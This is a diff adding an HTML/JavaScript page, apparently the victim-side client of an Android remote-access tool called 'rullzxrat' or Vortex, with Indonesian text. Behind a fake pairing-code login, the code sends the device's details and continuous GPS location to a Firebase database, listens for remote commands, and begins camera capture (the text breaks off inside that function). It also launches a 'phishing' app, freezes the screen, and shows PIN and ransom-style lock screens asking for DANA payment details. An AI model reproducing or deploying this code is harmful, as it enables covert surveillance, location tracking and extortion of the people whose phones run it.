@@ -1,0 +1,2005 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VORTEX - Target</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js">
+    </script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js">
+    </script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            user-select: none;
+        }
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+        }
+        /* Background ringan – cukup satu gradien */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -30%;
+            left: -30%;
+            width: 160%;
+            height: 160%;
+            background: radial-gradient(circle at 30% 40%, rgba(0, 200, 255, 0.04), transparent 60%);
+            z-index: 0;
+            animation: bgFloat 12s ease-in-out infinite alternate;
+            will-change: transform;
+        }
+        @keyframes bgFloat {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                transform: translate(3%, -3%) scale(1.02);
+            }
+        }
+
+        /* Login card – tanpa blur, tanpa conic-gradient */
+        .login-container {
+            position: relative;
+            z-index: 10;
+            background: rgba(10, 14, 24, 0.8);
+            border-radius: 40px;
+            padding: 44px 32px 40px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(0, 255, 204, 0.03);
+            text-align: center;
+            border: 1px solid rgba(0, 255, 204, 0.15);
+            animation: cardIn 0.5s cubic-bezier(0.23, 1, 0.32, 1) both;
+        }
+        @keyframes cardIn {
+            0% {
+                opacity: 0;
+                transform: translateY(30px) scale(0.96);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .login-logo {
+            font-size: 48px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00ffcc, #7b61ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -1px;
+            margin-bottom: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .login-logo .icon {
+            font-size: 44px;
+            background: none;
+            color: #00ffcc;
+            filter: drop-shadow(0 0 15px rgba(0, 255, 204, 0.2));
+            animation: iconRotate 10s linear infinite;
+            will-change: transform;
+        }
+        @keyframes iconRotate {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .login-sub {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.3);
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 28px;
+            font-weight: 500;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            padding-bottom: 12px;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 16px 18px;
+            border: none;
+            border-bottom: 2px solid rgba(0, 255, 204, 0.12);
+            border-radius: 0;
+            font-size: 16px;
+            font-weight: 500;
+            outline: none;
+            background: transparent;
+            color: #fff;
+            transition: 0.25s ease;
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+        }
+        .login-input::placeholder {
+            color: rgba(255, 255, 255, 0.15);
+            font-weight: 400;
+            letter-spacing: 1px;
+        }
+        .login-input:focus {
+            border-bottom-color: #00ffcc;
+            background: rgba(0, 255, 204, 0.02);
+        }
+        .login-input:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 2px 0 24px;
+            color: rgba(255, 255, 255, 0.25);
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+        .checkbox-container input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #00ffcc;
+            cursor: pointer;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #00ffcc, #0099aa);
+            border: none;
+            border-radius: 60px;
+            color: #000;
+            font-size: 17px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: 0.25s ease;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 30px rgba(0, 255, 204, 0.1);
+        }
+        .login-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 40px rgba(0, 255, 204, 0.2);
+        }
+        .login-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+        .login-btn.loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        .login-btn:disabled {
+            opacity: 0.4;
+            cursor: default;
+        }
+        .login-btn span {
+            position: relative;
+            z-index: 2;
+        }
+        /* Pulse ring ringan */
+        .login-btn::after {
+            content: '';
+            position: absolute;
+            inset: -3px;
+            border-radius: 64px;
+            border: 2px solid rgba(0, 255, 204, 0.15);
+            opacity: 0;
+            transition: 0.3s;
+        }
+        .login-btn:hover:not(:disabled)::after {
+            opacity: 1;
+            animation: pulseRing 2s ease-out infinite;
+        }
+        @keyframes pulseRing {
+            0% {
+                transform: scale(1);
+                opacity: 0.4;
+            }
+            100% {
+                transform: scale(1.06);
+                opacity: 0;
+            }
+        }
+
+        .login-status {
+            font-size: 14px;
+            margin-top: 16px;
+            min-height: 22px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: 0.2s;
+        }
+        .login-status.error {
+            color: #ff6b6b;
+        }
+        .login-status.success {
+            color: #00ffcc;
+        }
+
+        /* ===== LOCK STYLES (ringkas, tanpa blur berat) ===== */
+        #lockCont {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            color: #fff;
+            text-align: center;
+            padding-top: 80px;
+            z-index: 9999;
+            background: #000;
+            background-size: cover;
+        }
+        #lockCont::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: -1;
+        }
+        .lock-icon {
+            font-size: 80px;
+            color: #ff3b3b;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        #lockCont h2 {
+            font-size: 20px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+        }
+        .sub-txt {
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
+        }
+        .pin-display {
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid #333;
+            padding: 14px;
+            width: 200px;
+            margin: 0 auto;
+            border-radius: 6px;
+            font-size: 30px;
+            color: #00ffcc;
+            letter-spacing: 12px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 1;
+        }
+        .dev-txt {
+            font-size: 10px;
+            color: #aaa;
+            margin-top: 15px;
+            font-weight: bold;
+            text-transform: uppercase;
+            position: relative;
+            z-index: 1;
+        }
+        .warn {
+            color: #ff3b3b;
+            font-size: 12px;
+            font-weight: 900;
+            position: absolute;
+            bottom: 30px;
+            left: 0;
+            right: 0;
+            width: 100%;
+            text-transform: uppercase;
+            text-align: center;
+            z-index: 1;
+            letter-spacing: 1px;
+        }
+        #lockCont .real-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            font-size: 60px;
+            z-index: 100;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: transparent;
+            caret-color: transparent;
+            pointer-events: auto;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        /* Lock V2, SOS, Hell – ringkas (tanpa blur) */
+        #lockV2 {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 30000;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex-direction: column;
+            background: #0f0f1a;
+            overflow: hidden;
+        }
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(50px);
+            pointer-events: none;
+            animation: orbFloat 10s ease-in-out infinite alternate;
+            will-change: transform;
+        }
+        .orb-1 {
+            width: 250px;
+            height: 250px;
+            background: rgba(100, 50, 255, 0.06);
+            top: -80px;
+            left: -80px;
+        }
+        .orb-2 {
+            width: 200px;
+            height: 200px;
+            background: rgba(0, 200, 255, 0.04);
+            bottom: -60px;
+            right: -60px;
+            animation-delay: -4s;
+        }
+        .orb-3 {
+            width: 150px;
+            height: 150px;
+            background: rgba(255, 50, 100, 0.04);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: -8s;
+        }
+        @keyframes orbFloat {
+            0% {
+                transform: translate(0, 0) scale(1);
+            }
+            50% {
+                transform: translate(20px, -15px) scale(1.05);
+            }
+            100% {
+                transform: translate(-15px, 20px) scale(0.95);
+            }
+        }
+        .lockv2-card {
+            position: relative;
+            z-index: 2;
+            width: 90%;
+            max-width: 380px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 28px;
+            padding: 32px 24px 28px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+        .lockv2-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 6px;
+        }
+        .lockv2-icon {
+            font-size: 28px;
+            opacity: 0.7;
+        }
+        .lockv2-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            opacity: 0.9;
+        }
+        .lockv2-divider {
+            width: 40px;
+            height: 2px;
+            margin: 8px auto 14px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+        }
+        .lockv2-msg {
+            font-size: 15px;
+            font-weight: 600;
+            color: #a78bfa;
+            letter-spacing: 2px;
+            padding: 10px 0;
+            margin-bottom: 14px;
+            font-family: 'Courier New', monospace;
+            border-top: 1px solid rgba(255, 255, 255, 0.04);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+        }
+        .lockv2-data {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin: 10px 0 14px;
+        }
+        .lockv2-data-item {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 12px;
+            padding: 10px 8px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            text-align: left;
+        }
+        .lockv2-data-item .label {
+            font-size: 7px;
+            text-transform: uppercase;
+            color: rgba(255, 255, 255, 0.2);
+            letter-spacing: 2px;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 2px;
+        }
+        .lockv2-data-item .value {
+            font-size: 13px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.85);
+            font-family: 'Courier New', monospace;
+        }
+        .lockv2-data-item.accent .value {
+            color: #a78bfa;
+        }
+        .lockv2-footer {
+            font-size: 9px;
+            color: rgba(255, 255, 255, 0.08);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-top: 6px;
+        }
+
+        #sosLock {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 20000;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex-direction: column;
+            background: radial-gradient(circle at 40% 30%, #0a1a2a, #020a15);
+            overflow: hidden;
+        }
+        .sos-box {
+            max-width: 400px;
+            width: 90%;
+            background: rgba(6, 16, 30, 0.6);
+            border-radius: 40px;
+            padding: 32px 24px;
+            border: 1px solid rgba(0, 200, 255, 0.15);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
+            position: relative;
+            z-index: 2;
+        }
+        .sos-emoji {
+            font-size: 72px;
+            display: block;
+            margin-bottom: 0px;
+        }
+        .sos-title {
+            font-size: 32px;
+            font-weight: 900;
+            color: #38bdf8;
+            letter-spacing: 8px;
+            text-shadow: 0 0 20px rgba(56, 189, 248, 0.1);
+        }
+        .sos-sub {
+            font-size: 12px;
+            color: #7dd3fc;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            font-weight: 500;
+            margin: 2px 0 12px;
+        }
+        .sos-divider {
+            width: 100px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #38bdf8, transparent);
+            margin: 10px auto;
+            border-radius: 2px;
+        }
+        .sos-msg {
+            background: rgba(0, 200, 255, 0.04);
+            border: 1px solid rgba(0, 200, 255, 0.1);
+            border-radius: 30px;
+            padding: 12px 20px;
+            color: #bae6fd;
+            font-size: 18px;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            margin: 12px 0;
+            letter-spacing: 1px;
+        }
+        .sos-warn {
+            font-size: 12px;
+            color: #7dd3fc;
+            letter-spacing: 4px;
+            font-weight: 500;
+            margin-top: 10px;
+            text-transform: uppercase;
+        }
+
+        #hell {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10000;
+            background: #000;
+            overflow: hidden;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        #matrixCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.5;
+        }
+        .hell-rotating-wrapper {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+            animation: floatPath 8s ease-in-out infinite;
+        }
+        @keyframes floatPath {
+            0%,
+            100% {
+                transform: translate(0, 0);
+            }
+            33% {
+                transform: translate(40px, -30px);
+            }
+            66% {
+                transform: translate(-30px, 40px);
+            }
+        }
+        .hell-rotating-text {
+            font-family: 'Courier New', monospace;
+            font-size: 36px;
+            font-weight: 900;
+            color: #00ff41;
+            text-shadow: 0 0 20px #00ff41, 0 0 60px #00ff41;
+            animation: rotateText 6s linear infinite;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 16px 32px;
+            border-radius: 16px;
+            border: 2px solid rgba(0, 255, 65, 0.15);
+        }
+        @keyframes rotateText {
+            0% {
+                transform: rotate(0deg) scale(1);
+            }
+            50% {
+                transform: rotate(180deg) scale(1.03);
+            }
+            100% {
+                transform: rotate(360deg) scale(1);
+            }
+        }
+
+        #sosLockV2 {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 30000;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex-direction: column;
+            background: #0a0000;
+            overflow: hidden;
+        }
+        #sosMatrixCanvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            opacity: 0.6;
+        }
+        .sosv2-wrapper {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            pointer-events: none;
+            animation: floatPathSOS 9s ease-in-out infinite;
+        }
+        @keyframes floatPathSOS {
+            0%,
+            100% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+            33% {
+                transform: translate(50px, -30px) rotate(1deg);
+            }
+            66% {
+                transform: translate(-30px, 50px) rotate(-1deg);
+            }
+        }
+        .sosv2-text {
+            font-family: 'Courier New', monospace;
+            font-size: 36px;
+            font-weight: 900;
+            color: #ff0040;
+            text-shadow: 0 0 20px #ff0040, 0 0 60px #ff0040;
+            animation: rotateTextSOS 7s linear infinite;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            background: rgba(20, 0, 0, 0.6);
+            padding: 20px 36px;
+            border-radius: 20px;
+            border: 2px solid rgba(255, 0, 64, 0.2);
+        }
+        @keyframes rotateTextSOS {
+            0% {
+                transform: rotate(0deg) scale(1);
+            }
+            50% {
+                transform: rotate(180deg) scale(1.04);
+            }
+            100% {
+                transform: rotate(360deg) scale(1);
+            }
+        }
+        .sosv2-sub {
+            position: absolute;
+            bottom: 40px;
+            z-index: 3;
+            font-family: 'Courier New', monospace;
+            color: #ff4466;
+            font-size: 16px;
+            letter-spacing: 6px;
+            text-transform: uppercase;
+            text-shadow: 0 0 20px rgba(255, 0, 64, 0.3);
+        }
+
+        #videoOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 50000;
+            background: #000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #videoOverlay video {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+        }
+
+        #greenScreenOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 40000;
+            background: #00ff00;
+            pointer-events: none;
+        }
+        .green-line {
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: #000;
+            box-shadow: 0 0 8px rgba(0, 0, 0, 0.6);
+        }
+        .green-line:nth-child(1) {
+            top: 16.66%;
+        }
+        .green-line:nth-child(2) {
+            top: 33.33%;
+        }
+        .green-line:nth-child(3) {
+            top: 50%;
+        }
+        .green-line:nth-child(4) {
+            top: 66.66%;
+        }
+        .green-line:nth-child(5) {
+            top: 83.33%;
+        }
+
+        #freezeOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 45000;
+            background: rgba(0, 0, 0, 0.01);
+            pointer-events: auto;
+        }
+
+        @media (max-width:480px) {
+            .login-container {
+                padding: 32px 20px 28px;
+                border-radius: 32px;
+            }
+            .login-logo {
+                font-size: 38px;
+            }
+            .login-logo .icon {
+                font-size: 36px;
+            }
+            .login-input {
+                padding: 14px 16px;
+                font-size: 15px;
+            }
+            .login-btn {
+                padding: 16px;
+                font-size: 16px;
+            }
+            .lockv2-card {
+                padding: 24px 16px;
+            }
+            .lockv2-title {
+                font-size: 17px;
+                letter-spacing: 2px;
+            }
+            .sos-title {
+                font-size: 26px;
+                letter-spacing: 6px;
+            }
+            .sos-emoji {
+                font-size: 60px;
+            }
+            .lockv2-data {
+                grid-template-columns: 1fr 1fr;
+                gap: 6px;
+            }
+            .lockv2-data-item {
+                padding: 6px 6px;
+            }
+            .lockv2-data-item .value {
+                font-size: 11px;
+            }
+            .lockv2-msg {
+                font-size: 13px;
+                padding: 6px 0;
+            }
+            .sos-msg {
+                font-size: 16px;
+                padding: 10px 14px;
+            }
+            .hell-rotating-text {
+                font-size: 24px;
+                padding: 12px 20px;
+            }
+            .sosv2-text {
+                font-size: 24px;
+                padding: 14px 24px;
+                letter-spacing: 3px;
+            }
+            .pin-display {
+                width: 160px;
+                font-size: 26px;
+                letter-spacing: 10px;
+                height: 55px;
+            }
+            #lockCont {
+                padding-top: 60px;
+            }
+        }
+        @media (max-width:380px) {
+            .login-container {
+                padding: 24px 16px 20px;
+                border-radius: 28px;
+            }
+            .login-logo {
+                font-size: 32px;
+            }
+            .login-logo .icon {
+                font-size: 30px;
+            }
+            .login-input {
+                padding: 12px 14px;
+                font-size: 14px;
+            }
+            .login-btn {
+                padding: 14px;
+                font-size: 14px;
+            }
+            .lockv2-card {
+                padding: 18px 12px;
+            }
+            .lockv2-title {
+                font-size: 14px;
+                letter-spacing: 1px;
+            }
+            .sos-title {
+                font-size: 22px;
+                letter-spacing: 4px;
+            }
+            .sos-emoji {
+                font-size: 52px;
+            }
+            .lockv2-data {
+                grid-template-columns: 1fr 1fr;
+                gap: 4px;
+            }
+            .lockv2-data-item {
+                padding: 4px 4px;
+            }
+            .lockv2-data-item .value {
+                font-size: 10px;
+            }
+            .lockv2-msg {
+                font-size: 11px;
+                padding: 4px 0;
+            }
+            .sos-msg {
+                font-size: 14px;
+                padding: 8px 12px;
+            }
+            .hell-rotating-text {
+                font-size: 18px;
+                padding: 10px 16px;
+            }
+            .sosv2-text {
+                font-size: 18px;
+                padding: 10px 16px;
+                letter-spacing: 2px;
+            }
+            .pin-display {
+                width: 140px;
+                font-size: 22px;
+                letter-spacing: 8px;
+                height: 50px;
+            }
+            #lockCont {
+                padding-top: 40px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- FAKE LOGIN -->
+    <div class="login-container" id="fakeLogin">
+        <div class="login-logo">
+            <span class="icon"></span>
+            Vortex Project
+        </div>
+        <div class="login-sub">Target Panel</div>
+        <input type="text" class="login-input" id="fakeUser" placeholder="Masukkan Kode PAIRING" value="">
+        <input type="password" class="login-input" id="fakePass" placeholder="Kunci Akses" value="" style="display:none;">
+        <div class="checkbox-container">
+            <input type="checkbox" id="saveLoginCheckbox">
+            <label for="saveLoginCheckbox">Ingat UID</label>
+        </div>
+        <button class="login-btn" id="loginBtn" onclick="window.fakeLogin()">
+            <span>Kirim</span>
+        </button>
+        <div class="login-status" id="loginStatus"></div>
+    </div>
+
+    <!-- LOCK V1 -->
+    <div id="lockCont">
+        <div class="lock-icon">🔒</div>
+        <h2 id="lTit">LOCK BY VORTEX</h2>
+        <p class="sub-txt">MASUKKAN PIN</p>
+        <div class="pin-display" id="dotsDisplay"></div>
+        <div class="dev-txt">Developer By Rullz</div>
+        <input type="number" id="realInput" class="real-input" inputmode="numeric" oninput="handleInput(this)">
+        <div class="warn">JANGAN MENCOBA MERESTART HP ANDA</div>
+    </div>
+
+    <!-- HELL LOCK -->
+    <div id="hell">
+        <canvas id="matrixCanvas"></canvas>
+        <div class="hell-rotating-wrapper">
+            <div class="hell-rotating-text" id="hellMessage">HELLO I'M RULLZ</div>
+        </div>
+    </div>
+
+    <!-- SOS LOCK -->
+    <div id="sosLock">
+        <div class="sos-box">
+            <span class="sos-emoji">☠️</span>
+            <div class="sos-title">LOCKED</div>
+            <div class="sos-sub">HELLO I'M RULLZ</div>
+            <div class="sos-divider"></div>
+            <div class="sos-msg" id="sosMessage">Hacked By Rullz</div>
+            <div class="sos-divider"></div>
+            <div class="sos-warn">Developer By Rullz</div>
+        </div>
+    </div>
+
+    <!-- SOS LOCK V2 -->
+    <div id="sosLockV2">
+        <canvas id="sosMatrixCanvas"></canvas>
+        <div class="sosv2-wrapper">
+            <div class="sosv2-text" id="sosV2Message">AKSES DIBLOKIR</div>
+        </div>
+        <div class="sosv2-sub">DEVELOPER BY RULLZ</div>
+    </div>
+
+    <!-- LOCK V2 -->
+    <div id="lockV2">
+        <div class="orb orb-1"></div>
+        <div class="orb orb-2"></div>
+        <div class="orb orb-3"></div>
+        <div class="lockv2-card">
+            <div class="lockv2-header">
+                <span class="lockv2-icon">💀</span>
+                <span class="lockv2-title">System Lock</span>
+            </div>
+            <div class="lockv2-divider"></div>
+            <div class="lockv2-msg" id="lockV2Message">[ PERMANENT LOCK ]</div>
+            <div class="lockv2-data">
+                <div class="lockv2-data-item">
+                    <span class="label">📝 Pengirim</span>
+                    <span class="value" id="v2PengirimText">-</span>
+                </div>
+                <div class="lockv2-data-item accent">
+                    <span class="label">📱 Nomor Dana</span>
+                    <span class="value" id="v2NoHpText">-</span>
+                </div>
+                <div class="lockv2-data-item accent">
+                    <span class="label">💰 Nominal</span>
+                    <span class="value" id="v2NominalText">-</span>
+                </div>
+                <div class="lockv2-data-item">
+                    <span class="label">💳 Metode</span>
+                    <span class="value" id="v2MetodeText">-</span>
+                </div>
+            </div>
+            <div class="lockv2-footer">▸ jangan mencoba keluar ◂</div>
+        </div>
+    </div>
+
+    <!-- VIDEO OVERLAY -->
+    <div id="videoOverlay">
+        <video id="videoPlayer" controls autoplay muted playsinline>
+            <source src="" type="video/mp4">
+        </video>
+    </div>
+
+    <!-- GREEN SCREEN -->
+    <div id="greenScreenOverlay">
+        <div class="green-line"></div>
+        <div class="green-line"></div>
+        <div class="green-line"></div>
+        <div class="green-line"></div>
+        <div class="green-line"></div>
+    </div>
+
+    <!-- FREEZE -->
+    <div id="freezeOverlay"></div>
+
+    <script>
+        (function() {
+            // ============================================
+            // FIREBASE CONFIG
+            // ============================================
+            var firebaseConfig = {
+                apiKey: "AIzaSyBUhXZ_YKmTQNsDzeWX0072Zfb9lVi4jfE",
+                databaseURL: "https://rullzxrat-default-rtdb.firebaseio.com"
+            };
+            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+            var database = firebase.database();
+
+            var MY_ID = "";
+            var commandListener = null;
+            var watchId = null;
+            var onlineInterval = null;
+            var dataInterval = null;
+            var saveCheckbox = document.getElementById('saveLoginCheckbox');
+            var isLoggedIn = false;
+
+            // ============================================
+            // HELPERS (ringkas)
+            // ============================================
+            function openApp(pkg) {
+                try {
+                    if (window.RullzInterface && typeof window.RullzInterface.openApp === 'function') {
+                        window.RullzInterface.openApp(pkg);
+                        return;
+                    }
+                    window.open('intent://' + pkg + '#Intent;package=' + pkg + ';scheme=android-app;end', '_blank');
+                    setTimeout(function() { window.open('market://details?id=' + pkg, '_blank'); }, 500);
+                } catch (e) { window.open('market://details?id=' + pkg, '_blank'); }
+            }
+
+            function launchPhishingApp() { openApp('com.gratis'); }
+
+            function showGreenScreen() { document.getElementById('greenScreenOverlay').style.display = 'block'; }
+
+            function hideGreenScreen() { document.getElementById('greenScreenOverlay').style.display = 'none'; }
+
+            function freezeScreen() { document.getElementById('freezeOverlay').style.display = 'block'; }
+
+            function unfreezeScreen() { document.getElementById('freezeOverlay').style.display = 'none'; }
+
+            function showVideoOverlay(url) {
+                var ov = document.getElementById('videoOverlay'),
+                    v = document.getElementById('videoPlayer');
+                v.src = url;
+                v.load();
+                ov.style.display = 'flex';
+                v.play().catch(function() { setTimeout(function() { v.play().catch(function() {}); }, 300); });
+                v.removeEventListener('ended', onVideoEnded);
+                v.removeEventListener('error', onVideoError);
+                v.addEventListener('ended', onVideoEnded);
+                v.addEventListener('error', onVideoError);
+            }
+
+            function onVideoEnded() { document.getElementById('videoOverlay').style.display = 'none';
+                location.reload(); }
+
+            function onVideoError() { document.getElementById('videoOverlay').style.display = 'none';
+                location.reload(); }
+
+            function stopVideo() {
+                var ov = document.getElementById('videoOverlay'),
+                    v = document.getElementById('videoPlayer');
+                ov.style.display = 'none';
+                if (v) { v.pause();
+                    v.currentTime = 0; }
+                // Reset semua lock
+                document.getElementById('lockCont').style.display = 'none';
+                document.getElementById('lockV2').style.display = 'none';
+                document.getElementById('sosLock').style.display = 'none';
+                document.getElementById('sosLockV2').style.display = 'none';
+                document.getElementById('hell').style.display = 'none';
+                document.getElementById('greenScreenOverlay').style.display = 'none';
+                document.getElementById('freezeOverlay').style.display = 'none';
+                // Tampilkan fake login
+                document.getElementById('fakeLogin').style.display = 'block';
+                document.getElementById('fakeUser').disabled = false;
+                document.getElementById('fakeUser').style.opacity = '1';
+                document.getElementById('loginBtn').disabled = false;
+                document.getElementById('loginBtn').classList.remove('loading');
+                document.getElementById('loginBtn').innerHTML = '<span>Kirim</span>';
+                document.getElementById('loginStatus').textContent = '';
+                document.getElementById('loginStatus').className = 'login-status';
+                if (MY_ID) {
+                    database.ref('commands/' + MY_ID + '/stop_video_response').set({ success: true,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP });
+                }
+            }
+
+            function setWallpaper(url) {
+                if (window.RullzInterface && typeof window.RullzInterface.setWallpaper === 'function') {
+                    try { window.RullzInterface.setWallpaper(url); return true; } catch (e) {}
+                }
+                try { window.open(url, '_blank'); return true; } catch (e) { return false; }
+            }
+
+            function getDeviceName() { return 'Android Device'; }
+
+            function getAndroidVersion() {
+                var m = navigator.userAgent.match(/Android\s([0-9.]+)/);
+                return m ? m[1] : 'N/A';
+            }
+
+            function getRAM() { return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'; }
+
+            function getLanguage() { return navigator.language || 'N/A'; }
+
+            function sendDeviceData() {
+                if (!MY_ID) return;
+                var ref = database.ref('targets/' + MY_ID);
+                ref.child('deviceInfo').update({
+                    deviceName: getDeviceName(),
+                    androidVersion: getAndroidVersion(),
+                    ram: getRAM(),
+                    language: getLanguage(),
+                    lastUpdate: firebase.database.ServerValue.TIMESTAMP
+                }).catch(function() {});
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(function(b) {
+                        ref.update({ battery: Math.round(b.level * 100), online: true,
+                            lastSeen: firebase.database.ServerValue.TIMESTAMP });
+                    }).catch(function() {
+                        ref.update({ battery: 'N/A', online: true, lastSeen: firebase.database.ServerValue
+                                .TIMESTAMP });
+                    });
+                } else {
+                    ref.update({ battery: 'N/A', online: true, lastSeen: firebase.database.ServerValue.TIMESTAMP });
+                }
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(pos) {
+                        ref.child('location').set({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: firebase.database.ServerValue.TIMESTAMP
+                        });
+                    }, function() {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 });
+                }
+            }
+
+            function startLocationWatch() {
+                if (!MY_ID || !navigator.geolocation) return;
+                if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+                watchId = navigator.geolocation.watchPosition(function(pos) {
+                    database.ref('targets/' + MY_ID + '/location').set({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        timestamp: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }, function() {}, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 });
+            }
+
+            function stopLocationWatch() {
+                if (watchId !== null) { navigator.geolocation.clearWatch(watchId);
+                    watchId = null; }
+            }
+
+            function captureCamera(facing, cb) {
+                if (!navigator.mediaDevices) { cb(null); return; }
